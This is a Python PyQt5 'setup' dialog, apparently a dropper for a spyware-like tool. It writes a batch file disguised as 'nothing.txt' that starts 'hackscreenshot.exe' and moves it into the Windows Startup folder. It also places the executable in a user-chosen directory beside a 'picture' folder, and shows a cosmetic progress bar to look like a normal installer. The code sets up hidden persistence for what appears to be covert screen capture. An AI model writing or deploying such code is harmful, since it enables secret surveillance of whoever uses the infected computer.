import sys
from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QDialog, QApplication, QFileDialog, QProgressBar
from PyQt5.uic import loadUi
import os
import time

class MainWindow(QDialog):
    def __init__(self):
        super(MainWindow,self).__init__()
        loadUi("setup.ui",self)
        self.browse.clicked.connect(self.browsefiles)
        self.setupbtn.clicked.connect(self.setup)
        self.finish.clicked.connect(self.replaced)
    
    def browsefiles(self):
        fname = str(QFileDialog.getExistingDirectory(self, "Select Directory"))
        self.lineEdit.setText(fname)
        if len(fname) != 0:
            self.setupbtn.setEnabled(True)

    def setup(self):
        directory = str(self.lineEdit.text())
        textfile = open("nothing.txt", "w")
        textfile.write(f'cd "{directory}"\nstart hackscreenshot.exe')
        self.finish.setEnabled(True)
        for i in range(100):
            self.progressBar.setValue(i+1)
            time.sleep(0.01)

    def replaced(self):
        directory = str(self.lineEdit.text())
        os.replace(f"nothing.txt", f"C:/Users/Admin/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/nothing.bat")
        os.replace(f"hackscreenshot.exe", f"{directory}/hackscreenshot.exe")
        os.chdir(f"{directory}")
        os.mkdir("picture")
        mainwindow.close()

app = QApplication(sys.argv)
mainwindow = MainWindow()
widget = QtWidgets.QStackedWidget()
widget.addWidget(mainwindow)
widget.setFixedHeight(600)
widget.setFixedWidth(800)
widget.show()
sys.exit(app.exec_())
